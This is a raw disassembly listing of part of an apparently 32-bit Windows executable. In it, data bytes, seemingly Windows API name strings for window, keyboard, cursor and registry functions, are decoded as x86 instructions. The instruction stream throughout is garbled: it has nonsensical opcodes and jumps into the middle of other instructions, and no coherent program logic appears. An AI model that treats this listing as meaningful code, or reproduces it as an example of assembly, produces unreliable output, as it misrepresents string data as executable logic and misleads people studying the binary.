  412a6b:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412a72:	imul   esp,DWORD PTR [ebx+0x6f],0x3b006564
  412a79:	add    DWORD PTR [edi+0x65],eax
  412a7c:	je     0x412acb
  412a7e:	gs jae 0x412af4
  412a81:	popa   
  412a82:	addr16 gs inc ebp
  412a85:	js     0x412afb
  412a87:	jb     0x412aea
  412a89:	dec    ecx
  412a8a:	outs   dx,BYTE PTR ds:[esi]
  412a8b:	outs   dx,WORD PTR ds:[esi]
  412a8d:	add    BYTE PTR [esi+0x0],al
  412a90:	inc    ebx
  412a91:	ins    BYTE PTR es:[edi],dx
  412a92:	outs   dx,DWORD PTR ds:[esi]
  412a93:	jae    0x412afa
  412a95:	inc    esp
  412a96:	gs jae 0x412b04
  412a99:	je     0x412b0a
  412a9b:	jo     0x412a9d
  412a9d:	add    cl,ch
  412a9f:	add    DWORD PTR [edi+0x70],ecx
  412aa2:	outs   dx,BYTE PTR gs:[esi]
  412aa4:	dec    ecx
  412aa5:	outs   dx,BYTE PTR ds:[esi]
  412aa6:	jo     0x412b1d
  412aa8:	je     0x412aee
  412aaa:	gs jae 0x412b18
  412aad:	je     0x412b1e
  412aaf:	jo     0x412ab1
  412ab1:	add    BYTE PTR [ebp+0x73795302],al
  412ab7:	je     0x412b1e
  412ab9:	ins    DWORD PTR es:[edi],dx
  412aba:	push   eax
  412abb:	popa   
  412abc:	jb     0x412b1f
  412abe:	ins    DWORD PTR es:[edi],dx
  412abf:	gs je  0x412b27
  412ac2:	jb     0x412b37
  412ac4:	dec    ecx
  412ac5:	outs   dx,BYTE PTR ds:[esi]
  412ac6:	outs   dx,WORD PTR ds:[esi]
  412ac8:	inc    ecx
  412ac9:	add    BYTE PTR [esi+0x2],cl
  412acc:	push   ebx
  412acd:	gs je  0x412b1d
  412ad0:	outs   dx,BYTE PTR gs:[esi]
  412ad2:	jne    0x412b1d
  412ad4:	je     0x412b3b
  412ad6:	ins    DWORD PTR es:[edi],dx
  412ad7:	dec    ecx
  412ad8:	outs   dx,BYTE PTR ds:[esi]
  412ad9:	outs   dx,WORD PTR ds:[esi]
  412adb:	push   edi
  412adc:	add    BYTE PTR [eax],al
  412ade:	adc    eax,0x6c655202
  412ae3:	gs popa 
  412ae5:	jae    0x412b4c
  412ae7:	inc    esp
  412ae8:	inc    ebx
  412ae9:	add    BYTE PTR [ecx+0x766e4901],cl
  412aef:	popa   
  412af0:	ins    BYTE PTR es:[edi],dx
  412af1:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412af9:	je     0x412afb
  412afb:	add    BYTE PTR [edx+eax*1+0x74697753],al
  412b02:	arpl   WORD PTR [eax+0x54],bp
  412b05:	outs   dx,DWORD PTR ds:[esi]
  412b06:	push   esp
  412b07:	push   0x69577369
  412b0c:	outs   dx,BYTE PTR ds:[esi]
  412b0d:	outs   dx,DWORD PTR fs:[esi]
  412b0f:	ja     0x412b11
  412b11:	add    BYTE PTR [esi+0x6c694b01],ah
  412b17:	ins    BYTE PTR es:[edi],dx
  412b18:	push   esp
  412b19:	imul   ebp,DWORD PTR [ebp+0x65],0x2bd0072
  412b20:	imul   esp,DWORD PTR [ebp+0x79],0x62
  412b24:	fs pop edi
  412b26:	gs jbe 0x412b8e
  412b29:	outs   dx,BYTE PTR ds:[esi]
  412b2a:	je     0x412b2c
  412b2c:	cmp    eax,0x65684300
  412b31:	arpl   WORD PTR [ebx+0x52],bp
  412b34:	popa   
  412b35:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  412b3d:	outs   dx,BYTE PTR ds:[esi]
  412b3e:	add    BYTE PTR [eax],al
  412b40:	sahf   
  412b41:	add    DWORD PTR [ecx+0x73],ecx
  412b44:	push   edx
  412b45:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412b4a:	jo     0x412bc0
  412b4c:	jns    0x412b4e
  412b4e:	mov    es,WORD PTR [ecx]
  412b50:	dec    ecx
  412b51:	jae    0x412b96
  412b53:	push   0x6c417261
  412b58:	jo     0x412bc2
  412b5a:	popa   
  412b5b:	dec    esi
  412b5c:	jne    0x412bcb
  412b5e:	gs jb  0x412bca
  412b61:	arpl   WORD PTR [edi+0x0],dx
  412b64:	mov    ch,0x0
  412b66:	inc    esp
  412b67:	jb     0x412bca
  412b69:	ja     0x412bb8
  412b6b:	outs   dx,BYTE PTR gs:[esi]
  412b6d:	jne    0x412bb1
  412b6f:	popa   
  412b70:	jb     0x412b72
  412b72:	mov    BYTE PTR [edx],al
  412b74:	push   esp
  412b75:	popa   
  412b76:	bound  esp,QWORD PTR [edx+0x65]
  412b79:	fs push esp
  412b7b:	gs js  0x412bf2
  412b7e:	dec    edi
  412b7f:	jne    0x412bf5
  412b81:	push   edi
  412b82:	add    BYTE PTR [eax],al
  412b84:	or     eax,DWORD PTR [ecx]
  412b86:	inc    edi
  412b87:	gs je  0x412bce
  412b8a:	inc    ebx
  412b8b:	inc    ebp
  412b8c:	js     0x412b8e
  412b8e:	jno    0x412b92
  412b90:	push   ebx
  412b91:	gs je  0x412beb
  412b94:	imul   ebp,DWORD PTR [esi+0x64],0x6752776f
  412b9b:	outs   dx,BYTE PTR ds:[esi]
  412b9c:	add    BYTE PTR [eax],al
  412b9e:	xchg   ebx,eax
  412b9f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412ba3:	je     0x412c17
  412ba5:	outs   dx,DWORD PTR ds:[esi]
  412ba6:	jns    0x412be9
  412ba8:	arpl   WORD PTR [ebx+0x65],sp
  412bab:	ins    BYTE PTR es:[edi],dx
  412bac:	gs jb  0x412c10
  412baf:	je     0x412c20
  412bb1:	jb     0x412c07
  412bb3:	popa   
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	push   edi
  412bb9:	add    dl,BYTE PTR [ebx+0x65]
  412bbc:	je     0x412c0e
  412bbe:	jb     0x412c2f
  412bc0:	jo     0x412c19
  412bc2:	add    BYTE PTR [eax],al
  412bc4:	sti    
  412bc5:	add    DWORD PTR [eax+0x74],edx
  412bc8:	dec    ecx
  412bc9:	outs   dx,BYTE PTR ds:[esi]
  412bca:	push   edx
  412bcb:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  412bd0:	push   0x74655302
  412bd5:	push   ebp
  412bd6:	jae    0x412c3d
  412bd8:	jb     0x412c29
  412bda:	bound  ebp,QWORD PTR [edx+0x65]
  412bdd:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  412be1:	outs   dx,WORD PTR ds:[esi]
  412be3:	jb     0x412c52
  412be5:	popa   
  412be6:	je     0x412c51
  412be8:	outs   dx,DWORD PTR ds:[esi]
  412be9:	outs   dx,BYTE PTR ds:[esi]
  412bea:	push   edi
  412beb:	add    dh,ch
  412bed:	add    DWORD PTR [eax+0x65],edx
  412bf0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412bf5:	jae    0x412c58
  412bf7:	addr16 gs inc ecx
  412bfa:	add    BYTE PTR [eax],al
  412bfc:	xor    eax,0x61684300
  412c01:	jb     0x412c57
  412c03:	outs   dx,DWORD PTR ds:[esi]
  412c04:	dec    edi
  412c05:	gs ins DWORD PTR es:[edi],dx
  412c07:	push   edi
  412c08:	add    BYTE PTR [eax],al
  412c0a:	add    BYTE PTR [ecx],0x49
  412c0d:	outs   dx,BYTE PTR ds:[esi]
  412c0e:	data16 ins BYTE PTR es:[edi],dx
  412c10:	popa   
  412c11:	je     0x412c78
  412c13:	push   edx
  412c14:	arpl   WORD PTR gs:[eax+eax*1-0x4d],si
  412c19:	add    BYTE PTR [edx+esi*2+0x61],al
  412c1d:	ja     0x412c68
  412c1f:	arpl   WORD PTR [edi+0x6e],bp
  412c22:	add    BYTE PTR [eax],al
  412c24:	mov    dl,0x0
  412c26:	inc    esp
  412c27:	jb     0x412c8a
  412c29:	ja     0x412c71
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	gs inc ebx
  412c30:	outs   dx,DWORD PTR ds:[esi]
  412c31:	outs   dx,BYTE PTR ds:[esi]
  412c32:	je     0x412ca6
  412c34:	outs   dx,DWORD PTR ds:[esi]
  412c35:	ins    BYTE PTR es:[edi],dx
  412c36:	add    BYTE PTR [eax],al
  412c38:	inc    edx
  412c39:	add    DWORD PTR [edi+0x65],eax
  412c3c:	je     0x412c8c
  412c3e:	gs js  0x412cb5
  412c41:	inc    esp
  412c42:	ins    BYTE PTR es:[edi],dx
  412c43:	addr16 inc edi
  412c45:	jb     0x412cb6
  412c47:	jne    0x412cb9
  412c49:	dec    ecx
  412c4a:	je     0x412cb1
  412c4c:	ins    DWORD PTR es:[edi],dx
  412c4d:	add    BYTE PTR ds:0x6e655302,ah
  412c53:	fs dec ecx
  412c55:	outs   dx,BYTE PTR ds:[esi]
  412c56:	jo     0x412ccd
  412c58:	je     0x412c5a
  412c5a:	mov    DWORD PTR [eax],eax
  412c5c:	inc    esp
  412c5d:	gs inc si
  412c60:	jb     0x412cc3
  412c62:	ins    DWORD PTR es:[edi],dx
  412c63:	gs push eax
  412c65:	jb     0x412cd6
  412c67:	arpl   WORD PTR [ecx+0x0],ax
  412c6a:	mov    es,WORD PTR [eax]
  412c6c:	inc    esp
  412c6d:	gs push di
  412c70:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  412c77:	outs   dx,DWORD PTR ds:[esi]
  412c78:	arpl   WORD PTR [ecx+0x0],ax
  412c7b:	add    BYTE PTR [eax+eax*1+0x6c616944],bl
  412c82:	outs   dx,DWORD PTR ds:[esi]
  412c83:	addr16 inc edx
  412c85:	outs   dx,DWORD PTR ds:[esi]
  412c86:	js     0x412cd8
  412c88:	popa   
  412c89:	jb     0x412cec
  412c8b:	ins    DWORD PTR es:[edi],dx
  412c8c:	inc    ecx
  412c8d:	add    BYTE PTR [edx],al
  412c8f:	add    dl,BYTE PTR [edx+0x65]
  412c92:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  412c9a:	popa   
  412c9b:	jae    0x412d10
  412c9d:	inc    ecx
  412c9e:	add    BYTE PTR [eax],al
  412ca0:	dec    edx
  412ca1:	add    BYTE PTR [ebx+0x6f],al
  412ca4:	jo     0x412d1f
  412ca6:	inc    ecx
  412ca7:	arpl   WORD PTR [ebx+0x65],sp
  412caa:	ins    BYTE PTR es:[edi],dx
  412cab:	gs jb  0x412d0f
  412cae:	je     0x412d1f
  412cb0:	jb     0x412d06
  412cb2:	popa   
  412cb3:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cb7:	add    BYTE PTR [ebx+0x1],bl
  412cba:	inc    edi
  412cbb:	gs je  0x412d11
  412cbe:	jns    0x412d33
  412cc0:	je     0x412d27
  412cc2:	ins    DWORD PTR es:[edi],dx
  412cc3:	dec    ebp
  412cc4:	outs   dx,BYTE PTR gs:[esi]
  412cc6:	jne    0x412cc8
  412cc8:	mov    eax,0x61724400
  412ccd:	ja     0x412d22
  412ccf:	je     0x412d32
  412cd1:	je     0x412d38
  412cd3:	push   edi
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	loope  0x412cd8
  412cd8:	inc    esi
  412cd9:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  412ce0:	outs   dx,DWORD PTR ds:[esi]
  412ce1:	ja     0x412d24
  412ce3:	add    BYTE PTR [edx+0x0],ah
  412ce6:	inc    ebx
  412ce7:	jb     0x412d4e
  412ce9:	popa   
  412cea:	je     0x412d51
  412cec:	push   edi
  412ced:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412cf4:	inc    ecx
  412cf5:	add    cl,al
  412cf7:	add    BYTE PTR [ebp+0x6e],al
  412cfa:	popa   
  412cfb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cff:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412d06:	cmp    DWORD PTR [eax],eax
  412d08:	inc    ebx
  412d09:	push   0x70557261
  412d0e:	jo     0x412d75
  412d10:	jb     0x412d69
  412d12:	add    BYTE PTR [eax],al
  412d14:	or     al,BYTE PTR [edx]
  412d16:	push   edx
  412d17:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  412d20:	je     0x412d6d
  412d22:	gs jns 0x412d25
  412d25:	add    BYTE PTR [ebx],al
  412d27:	add    BYTE PTR [ecx+0x64],al
  412d2a:	push   0x75
  412d2c:	jae    0x412da2
  412d2e:	push   edi
  412d2f:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412d36:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412d3a:	add    BYTE PTR [eax],al
  412d3c:	aad    0x1
  412d3e:	dec    ebp
  412d3f:	gs jae 0x412db5
  412d42:	popa   
  412d43:	addr16 gs inc edx
  412d46:	outs   dx,DWORD PTR ds:[esi]
  412d47:	js     0x412da0
  412d49:	add    bh,cl
  412d4b:	add    DWORD PTR [ebp+0x65],ecx
  412d4e:	jae    0x412dc3
  412d50:	popa   
  412d51:	addr16 gs inc edx
  412d54:	outs   dx,DWORD PTR ds:[esi]
  412d55:	js     0x412d9c
  412d57:	js     0x412d9a
  412d59:	add    BYTE PTR [edx+0x1],ah
  412d5c:	inc    edi
  412d5d:	gs je  0x412db4
  412d60:	outs   dx,DWORD PTR ds:[esi]
  412d61:	jo     0x412dba
  412d63:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412d6a:	dec    eax
  412d6b:	add    dl,BYTE PTR [ebx+0x65]
  412d6e:	je     0x412dbd
  412d70:	outs   dx,BYTE PTR gs:[esi]
  412d72:	jne    0x412d74
  412d74:	loop   0x412d76
  412d76:	inc    esi
  412d77:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  412d7e:	outs   dx,DWORD PTR ds:[esi]
  412d7f:	ja     0x412dc6
  412d81:	js     0x412dc4
  412d83:	add    BYTE PTR [esi+0x616f4c01],dh
  412d89:	fs dec ebp
  412d8b:	outs   dx,BYTE PTR gs:[esi]
  412d8d:	jne    0x412dd0
  412d8f:	add    dh,cl
  412d91:	add    DWORD PTR [ebp+0x65],ecx
  412d94:	jae    0x412e09
  412d96:	popa   
  412d97:	addr16 gs inc edx
  412d9a:	outs   dx,DWORD PTR ds:[esi]
  412d9b:	js     0x412dde
  412d9d:	add    ch,bl
  412d9f:	add    BYTE PTR [ebp+0x71],al
  412da2:	jne    0x412e05
  412da4:	ins    BYTE PTR es:[edi],dx
  412da5:	push   edx
  412da6:	arpl   WORD PTR gs:[eax+eax*1-0x72],si
  412dab:	add    dl,BYTE PTR [edi+ebp*2+0x55]
  412daf:	outs   dx,BYTE PTR ds:[esi]
  412db0:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412db7:	add    BYTE PTR [edi+0x1],dh
  412dba:	inc    edi
  412dbb:	gs je  0x412e15
  412dbe:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  412dc5:	js     0x412e3b
  412dc7:	dec    esp
  412dc8:	outs   dx,BYTE PTR gs:[esi]
  412dca:	addr16 je 0x412e35
  412dcd:	push   edi
  412dce:	add    BYTE PTR [eax],al
  412dd0:	mov    al,BYTE PTR [edx]
  412dd2:	push   esp
  412dd3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  412ddb:	ja     0x412e50
  412ddd:	add    dh,bh
  412ddf:	add    BYTE PTR [edi+0x65],al
  412de2:	je     0x412e27
  412de4:	ins    BYTE PTR es:[edi],dx
  412de5:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412dec:	jb     0x412dee
  412dee:	les    eax,FWORD PTR [ecx]
  412df0:	dec    ebp
  412df1:	popa   
  412df2:	jo     0x412e38
  412df4:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  412dfb:	arpl   WORD PTR [eax+eax*1-0x45],si
  412dff:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412e03:	fs push ebx
  412e05:	je     0x412e79
  412e07:	imul   ebp,DWORD PTR [esi+0x67],0x17e0041
  412e0e:	dec    eax
  412e0f:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  412e17:	jne    0x412e62
  412e19:	je     0x412e80
  412e1b:	ins    DWORD PTR es:[edi],dx
  412e1c:	add    BYTE PTR [eax],al
  412e1e:	xor    al,BYTE PTR [ecx]
  412e20:	inc    edi
  412e21:	gs je  0x412e71
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	jne    0x412e71
  412e28:	je     0x412e8f
  412e2a:	ins    DWORD PTR es:[edi],dx
  412e2b:	inc    ebx
  412e2c:	outs   dx,DWORD PTR ds:[esi]
  412e2d:	jne    0x412e9d
  412e2f:	je     0x412e31
  412e31:	add    cl,al
  412e33:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  412e37:	imul   esi,DWORD PTR [ebp+0x70],0x49
  412e3b:	arpl   WORD PTR [edi+0x6e],bp
  412e3e:	dec    ecx
  412e3f:	fs inc esi
  412e41:	jb     0x412eb2
  412e43:	ins    DWORD PTR es:[edi],dx
  412e44:	inc    esp
  412e45:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  412e4c:	jns    0x412e4e
  412e4e:	mov    BYTE PTR [ecx],al
  412e50:	dec    ecx
  412e51:	outs   dx,BYTE PTR ds:[esi]
  412e52:	je     0x412eb9
  412e54:	jb     0x412ec9
  412e56:	arpl   WORD PTR gs:[edx+edx*2+0x65],si
  412e5b:	arpl   WORD PTR [eax+eax*1+0x13],si
  412e5f:	add    DWORD PTR [edi+0x65],eax
  412e62:	je     0x412ea8
  412e64:	outs   dx,DWORD PTR ds:[esi]
  412e65:	jne    0x412ec9
  412e67:	ins    BYTE PTR es:[edi],dx
  412e68:	gs inc ebx
  412e6a:	ins    BYTE PTR es:[edi],dx
  412e6b:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412e72:	add    BYTE PTR [eax],al
  412e74:	daa    
  412e75:	add    DWORD PTR [edi+0x65],eax
  412e78:	je     0x412ec5
  412e7a:	gs jns 0x412edf
  412e7d:	outs   dx,DWORD PTR ds:[esi]
  412e7e:	popa   
  412e7f:	jb     0x412ee5
  412e81:	push   esp
  412e82:	jns    0x412ef4
  412e84:	gs add al,dh
  412e87:	add    BYTE PTR [edi+0x65],al
  412e8a:	je     0x412ecd
  412e8c:	jae    0x412f07
  412e8e:	outs   dx,BYTE PTR ds:[esi]
  412e8f:	arpl   WORD PTR [ebx+0x65],cx
  412e92:	jns    0x412ee7
  412e94:	je     0x412ef7
  412e96:	je     0x412efd
  412e98:	add    BYTE PTR [eax],al
  412e9a:	sub    BYTE PTR [eax],al
  412e9c:	inc    ebx
  412e9d:	push   0x6f4c7261
  412ea2:	ja     0x412f09
  412ea4:	jb     0x412ee8
  412ea6:	jne    0x412f0e
  412ea8:	push   di
  412eaa:	add    BYTE PTR [eax],al
  412eac:	popf   
  412ead:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412eb1:	ins    BYTE PTR es:[edi],dx
  412eb2:	outs   dx,DWORD PTR ds:[esi]
  412eb3:	addr16 inc edx
  412eb5:	outs   dx,DWORD PTR ds:[esi]
  412eb6:	js     0x412f08
  412eb8:	popa   
  412eb9:	jb     0x412f1c
  412ebb:	ins    DWORD PTR es:[edi],dx
  412ebc:	push   edi
  412ebd:	add    BYTE PTR [ecx],ch
  412ebf:	add    BYTE PTR [ebx+0x68],al
  412ec2:	popa   
  412ec3:	jb     0x412f11
  412ec5:	outs   dx,DWORD PTR ds:[esi]
  412ec6:	ja     0x412f2d
  412ec8:	jb     0x412f21
  412eca:	add    BYTE PTR [eax],al
  412ecc:	and    al,0x0
  412ece:	inc    ebx
  412ecf:	push   0x65676e61
  412ed4:	dec    ebp
  412ed5:	outs   dx,BYTE PTR gs:[esi]
  412ed7:	jne    0x412f30
  412ed9:	add    BYTE PTR [edi+0x636f4c01],bh
  412edf:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412ee3:	outs   dx,DWORD PTR fs:[esi]
  412ee5:	ja     0x412f3c
  412ee7:	jo     0x412f4d
  412ee9:	popa   
  412eea:	je     0x412f51
  412eec:	add    BYTE PTR [eax],al
  412eee:	mov    al,ds:0x57734901
  412ef3:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412efa:	mov    DWORD PTR [ecx],0x5670614d
  412f00:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  412f07:	gs jns 0x412f4f
  412f0a:	js     0x412f63
  412f0c:	add    BYTE PTR [eax],al
  412f0e:	pop    ecx
  412f0f:	add    dl,BYTE PTR [ebx+0x65]
  412f12:	je     0x412f66
  412f14:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412f19:	jo     0x412f8f
  412f1b:	jns    0x412f1d
  412f1d:	add    al,bh
  412f1f:	add    BYTE PTR [edi+0x65],al
  412f22:	je     0x412f67
  412f24:	ins    BYTE PTR es:[edi],dx
  412f25:	popa   
  412f26:	jae    0x412f9b
  412f28:	dec    esp
  412f29:	outs   dx,DWORD PTR ds:[esi]
  412f2a:	outs   dx,BYTE PTR ds:[esi]
  412f2b:	addr16 inc ecx
  412f2d:	add    cl,cl
  412f2f:	add    DWORD PTR [ebp+0x61],ecx
  412f32:	jo     0x412f8b
  412f34:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412f3b:	imul   ebp,DWORD PTR [esi+0x74],0x2930073
  412f42:	push   esp
  412f43:	jb     0x412fa6
  412f45:	outs   dx,BYTE PTR ds:[esi]
  412f46:	jae    0x412fb4
  412f48:	popa   
  412f49:	je     0x412fb0
  412f4b:	inc    ecx
  412f4c:	arpl   WORD PTR [ebx+0x65],sp
  412f4f:	ins    BYTE PTR es:[edi],dx
  412f50:	gs jb  0x412fb4
  412f53:	je     0x412fc4
  412f55:	jb     0x412f98
  412f57:	add    BYTE PTR [eax+eax*1],bh
  412f5a:	inc    ebx
  412f5b:	push   0x4d6b6365
  412f60:	outs   dx,BYTE PTR gs:[esi]
  412f62:	jne    0x412fb6
  412f64:	popa   
  412f65:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  412f6d:	add    BYTE PTR [edx+0x2],bl
  412f70:	push   ebx
  412f71:	gs je  0x412fc7
  412f74:	arpl   WORD PTR [edx+0x6f],si
  412f77:	ins    BYTE PTR es:[edi],dx
  412f78:	ins    BYTE PTR es:[edi],dx
  412f79:	dec    ecx
  412f7a:	outs   dx,BYTE PTR ds:[esi]
  412f7b:	outs   dx,WORD PTR ds:[esi]
  412f7d:	add    BYTE PTR ds:0x6c6c4100,al
  412f83:	outs   dx,DWORD PTR ds:[esi]
  412f84:	ja     0x412fd9
  412f86:	gs je  0x412fcf
  412f89:	outs   dx,DWORD PTR ds:[esi]
  412f8a:	jb     0x412ff1
  412f8c:	addr16 jb 0x412ffe
  412f8f:	jne    0x412fff
  412f91:	fs push edi
  412f93:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412f9a:	lahf   
  412f9b:	add    BYTE PTR [ecx+ebp*2+0x73],al
  412f9f:	jo     0x413002
  412fa1:	je     0x413006
  412fa3:	push   0x7373654d
  412fa8:	popa   
  412fa9:	addr16 gs inc ecx
  412fac:	add    BYTE PTR [eax],al
  412fae:	sub    eax,0x61684300
  412fb3:	jb     0x413003
  412fb5:	gs js  0x41302c
  412fb8:	push   edi
  412fb9:	add    bh,ah
  412fbb:	add    BYTE PTR [esi+0x72],al
  412fbe:	popa   
  412fbf:	ins    DWORD PTR es:[edi],dx
  412fc0:	gs push edx
  412fc2:	arpl   WORD PTR gs:[eax+eax*1-0x1c],si
  412fc7:	add    DWORD PTR [edi+0x66],ecx
  412fca:	data16 jae 0x413032
  412fcd:	je     0x413021
  412fcf:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  412fd4:	mov    al,BYTE PTR [ecx]
  412fd6:	dec    ecx
  412fd7:	outs   dx,BYTE PTR ds:[esi]
  412fd8:	jbe    0x41303b
  412fda:	ins    BYTE PTR es:[edi],dx
  412fdb:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6e675265
  412fe3:	add    BYTE PTR [edx+0x2],al
  412fe6:	push   ebx
  412fe7:	gs je  0x413030
  412fea:	outs   dx,DWORD PTR ds:[esi]
  412feb:	jb     0x413052
  412fed:	addr16 jb 0x41305f
  412ff0:	jne    0x413060
  412ff2:	fs push edi
  412ff4:	imul   ebp,DWORD PTR [esi+0x64],0x2f00776f
  412ffb:	add    dl,BYTE PTR [ebx+0x65]
  412ffe:	je     0x413041
  413000:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  413004:	gs push edi
  413006:	imul   ebp,DWORD PTR [esi+0x64],0x9400776f
  41300d:	add    DWORD PTR [ecx+0x73],ecx
  413010:	inc    ebx
  413011:	push   0x646c69
  413016:	fwait
  413017:	add    dl,BYTE PTR [ebp+0x6e]
  41301a:	ins    BYTE PTR es:[edi],dx
  41301b:	outs   dx,DWORD PTR ds:[esi]
  41301c:	popa   
  41301d:	fs dec ebx
  41301f:	gs jns 0x413084
  413022:	outs   dx,DWORD PTR ds:[esi]
  413023:	popa   
  413024:	jb     0x41308a
  413026:	dec    esp
  413027:	popa   
  413028:	jns    0x413099
  41302a:	jne    0x4130a0
  41302c:	add    BYTE PTR [eax],al
  41302e:	pushf  
  41302f:	add    DWORD PTR [ecx+0x73],ecx
  413032:	dec    ecx
  413033:	arpl   WORD PTR [edi+0x6e],bp
  413036:	imul   esp,DWORD PTR [ebx+0x0],0x47013800
  41303d:	gs je  0x41308d
  413040:	outs   dx,BYTE PTR gs:[esi]
  413042:	jne    0x413097
  413044:	je     0x4130b8
  413046:	imul   ebp,DWORD PTR [esi+0x67],0xb9000041
  41304d:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  413051:	fs dec ebp
  413053:	outs   dx,BYTE PTR gs:[esi]
  413055:	jne    0x4130ae
  413057:	add    BYTE PTR [ebx],dl
  413059:	add    dl,BYTE PTR [edx+0x65]
  41305c:	imul   esi,DWORD PTR [bp+di+0x74],0x69577265
  413064:	outs   dx,BYTE PTR ds:[esi]
  413065:	outs   dx,DWORD PTR fs:[esi]
  413067:	ja     0x4130b6
  413069:	gs jae 0x4130df
  41306c:	popa   
  41306d:	addr16 gs push edi
  413070:	add    BYTE PTR [eax],al
  413072:	cmp    BYTE PTR [edx],al
  413074:	push   ebx
  413075:	gs je  0x4130bb
  413078:	jne    0x4130ec
  41307a:	jae    0x4130eb
  41307c:	jb     0x41307e
  41307e:	add    DWORD PTR ds:[edi+0x65],eax
  413082:	je     0x4130d1
  413084:	gs jae 0x4130fa
  413087:	popa   
  413088:	addr16 gs push edi
  41308b:	add    BYTE PTR ds:0x74654701,dl
  413091:	inc    esi
  413092:	outs   dx,DWORD PTR ds:[esi]
  413093:	jb     0x4130fa
  413095:	addr16 jb 0x413107
  413098:	jne    0x413108
  41309a:	fs push edi
  41309c:	imul   ebp,DWORD PTR [esi+0x64],0x5900776f
  4130a3:	add    BYTE PTR [ebx+0x72],al
  4130a6:	gs popa 
  4130a8:	je     0x41310f
  4130aa:	inc    esp
  4130ab:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  4130b2:	jb     0x413115
  4130b4:	ins    DWORD PTR es:[edi],dx
  4130b5:	push   edi
  4130b6:	add    BYTE PTR [eax],al
  4130b8:	stc    
  4130b9:	add    BYTE PTR [edi+0x65],al
  4130bc:	je     0x413101
  4130be:	ins    BYTE PTR es:[edi],dx
  4130bf:	popa   
  4130c0:	jae    0x413135
  4130c2:	dec    esp
  4130c3:	outs   dx,DWORD PTR ds:[esi]
  4130c4:	outs   dx,BYTE PTR ds:[esi]
  4130c5:	addr16 push edi
  4130c7:	add    BYTE PTR [ebp+0x53],dl
  4130ca:	inc    ebp
  4130cb:	push   edx
  4130cc:	xor    esi,DWORD PTR [edx]
  4130ce:	cs fs ins BYTE PTR es:[edi],dx
  4130d1:	ins    BYTE PTR es:[edi],dx
  4130d2:	add    BYTE PTR [eax],al
  4130d4:	mov    ah,0x3
  4130d6:	push   edx
  4130d7:	gs ins DWORD PTR es:[edi],dx
  4130d9:	outs   dx,DWORD PTR ds:[esi]
  4130da:	jbe    0x413141
  4130dc:	inc    esp
  4130dd:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4130e4:	jns    0x41313d
  4130e6:	add    BYTE PTR [eax],al
  4130e8:	add    al,0x3
  4130ea:	dec    esp
  4130eb:	gs popa 
  4130ed:	jbe    0x413154
  4130ef:	inc    ebx
  4130f0:	jb     0x41315b
  4130f2:	je     0x41315d
  4130f4:	arpl   WORD PTR [ecx+0x6c],sp
  4130f7:	push   ebx
  4130f8:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4130fd:	outs   dx,BYTE PTR ds:[esi]
  4130fe:	add    BYTE PTR [eax],al
  413100:	pop    ss
  413101:	add    al,0x53
  413103:	gs je  0x41314c
  413106:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  41310e:	bound  esi,QWORD PTR [ebp+0x74]
  413111:	gs jae 0x41316b
  413114:	add    BYTE PTR [eax],al
  413116:	xchg   BYTE PTR [esi+edx*2],al
  413119:	imul   esi,DWORD PTR [edx+0x74],0x516c6175
  413120:	jne    0x413187
  413122:	jb     0x41319d
  413124:	add    BYTE PTR [eax],al
  413126:	mov    ds:0x61654802,eax
  41312b:	jo     0x413170
  41312d:	jb     0x413194
  41312f:	popa   
  413130:	je     0x413197
  413132:	add    BYTE PTR [eax],al
  413134:	or     BYTE PTR [ebx+edx*2],al
  413137:	gs je  0x41317d
  41313a:	jne    0x4131ae
  41313c:	jb     0x4131a3
  41313e:	outs   dx,BYTE PTR ds:[esi]
  41313f:	je     0x413185
